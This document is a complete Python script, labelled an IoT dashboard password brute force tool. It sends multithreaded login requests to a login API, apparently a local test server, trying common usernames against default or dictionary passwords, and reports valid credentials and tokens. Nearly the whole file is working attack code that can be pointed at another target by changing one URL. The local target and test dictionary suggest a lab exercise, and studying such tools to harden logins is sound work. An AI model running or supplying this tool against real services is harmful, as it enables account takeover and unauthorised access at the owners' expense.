import requests
import time
import threading
import queue
import argparse
from concurrent.futures import ThreadPoolExecutor

# Target URL
login_url = "http://localhost:8000/api/login"

# Known usernames to try
usernames = ["admin", "user", "root", "administrator", "system"]

# Common passwords to try as fallback
default_passwords = [
    "password", "123456", "admin", "password123", "user123",
    "admin123", "qwerty", "letmein", "welcome", "test",
    "password1", "12345678", "abc123", "1234", "admin1"
]

# Synchronization for access to shared resources
print_lock = threading.Lock()
results_lock = threading.Lock()

# Keep track of successful logins
successful_logins = []


def try_login(username, password):
    """Try a single username/password combination"""
    # Create the payload
    payload = {
        "username": username,
        "password": password
    }

    try:
        # Send the login request
        response = requests.post(login_url, json=payload)

        # Parse the response
        data = response.json()

        # Use a lock when printing to avoid garbled output in multithreaded mode
        with print_lock:
            # Check if login was successful
            if data.get("success", False):
                print(f"[SUCCESS] Username: {username}, Password: {password}")
                token = data.get('token', 'No token found')
                print(f"Token: {token[:20]}...")  # Only show beginning of token

                # Use a lock when modifying shared data
                with results_lock:
                    successful_logins.append((username, password, data.get("token")))
                return True
            else:
                print(f"[FAILED] Username: {username}, Password: {password}")
                return False

    except Exception as e:
        with print_lock:
            print(f"[ERROR] {e}")
        return False


def worker(work_queue, delay=0.1):
    """Worker function that processes login attempts from the queue"""
    while not work_queue.empty():
        try:
            username, password = work_queue.get(block=False)
            try_login(username, password)
            time.sleep(delay)  # Add small delay to prevent overwhelming the server
            work_queue.task_done()
        except queue.Empty:
            break


def threaded_brute_force(max_threads=10, delay=0.1, dictionary_file=None):
    """Perform a threaded brute force attack using a work queue"""
    print(f"Starting threaded brute force attack with {max_threads} threads...")

    # Load passwords from dictionary file if specified
    if dictionary_file:
        try:
            with open(dictionary_file, 'r') as file:
                passwords = [line.strip() for line in file]
                print(f"Loaded {len(passwords)} passwords from {dictionary_file}")
        except FileNotFoundError:
            print(f"Dictionary file '{dictionary_file}' not found, using default passwords")
            passwords = default_passwords
    else:
        passwords = default_passwords

    # Create work queue with all username/password combinations
    work_queue = queue.Queue()
    for username in usernames:
        for password in passwords:
            work_queue.put((username, password))

    total_attempts = work_queue.qsize()
    print(f"Queued {total_attempts} login attempts")

    # Create and start worker threads
    threads = []
    for _ in range(min(max_threads, total_attempts)):
        t = threading.Thread(target=worker, args=(work_queue, delay))
        threads.append(t)
        t.start()

    # Wait for all login attempts to complete
    work_queue.join()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    # Print summary of successful logins
    print("\nThreaded Brute Force Attack completed.")
    print(f"Found {len(successful_logins)} valid login(s):")

    for username, password, token in successful_logins:
        print(f"Username: {username}, Password: {password}")
        print(f"Token: {token[:20]}...")  # Only show beginning of token
        print("---")


def pool_worker(args):
    """Worker function for thread pool executor"""
    username, password = args
    return try_login(username, password)


def thread_pool_brute_force(max_workers=10, dictionary_file=None):
    """Perform a brute force attack using ThreadPoolExecutor"""
    print(f"Starting thread pool brute force attack with {max_workers} workers...")

    # Load passwords from dictionary file if specified
    if dictionary_file:
        try:
            with open(dictionary_file, 'r') as file:
                passwords = [line.strip() for line in file]
                print(f"Loaded {len(passwords)} passwords from {dictionary_file}")
        except FileNotFoundError:
            print(f"Dictionary file '{dictionary_file}' not found, using default passwords")
            passwords = default_passwords
    else:
        passwords = default_passwords

    # Create all combinations
    combinations = [(username, password) for username in usernames for password in passwords]
    total_attempts = len(combinations)
    print(f"Prepared {total_attempts} login attempts")

    # Use ThreadPoolExecutor to manage the thread pool
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        # Submit all tasks and wait for them to complete
        results = list(executor.map(pool_worker, combinations))

    # Print summary of successful logins
    print("\nThread Pool Brute Force Attack completed.")
    print(f"Found {len(successful_logins)} valid login(s):")

    for username, password, token in successful_logins:
        print(f"Username: {username}, Password: {password}")
        print(f"Token: {token[:20]}...")  # Only show beginning of token
        print("---")


def create_test_dictionary(filename="passwords.txt"):
    """Create a test dictionary file with common passwords"""
    try:
        with open(filename, "w") as f:
            # Include the known passwords + some others
            passwords = [
                "password123",
                "user123",
                "admin",
                "root",
                "1234",
                "qwerty",
                "letmein",
                "password",
                "123456",
                "welcome",
                "administrator"
            ]
            f.write("\n".join(passwords))
        print(f"Created test dictionary file '{filename}'")
    except Exception as e:
        print(f"Error creating dictionary file: {e}")


if __name__ == "__main__":
    # Set up command line arguments
    parser = argparse.ArgumentParser(description="IoT Dashboard Password Brute Force Tool")
    parser.add_argument("--threads", type=int, default=5, help="Number of threads to use")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between attempts (seconds)")
    parser.add_argument("--dictionary", type=str, help="Path to password dictionary file")
    parser.add_argument("--create-dict", action="store_true", help="Create a test dictionary file")
    parser.add_argument("--method", choices=["queue", "pool"], default="queue",
                        help="Threading method: queue or thread pool")

    args = parser.parse_args()

    # Create test dictionary if requested
    if args.create_dict:
        create_test_dictionary()

    # Run the selected attack method
    if args.method == "queue":
        threaded_brute_force(max_threads=args.threads, delay=args.delay, dictionary_file=args.dictionary)
    else:
        thread_pool_brute_force(max_workers=args.threads, dictionary_file=args.dictionary)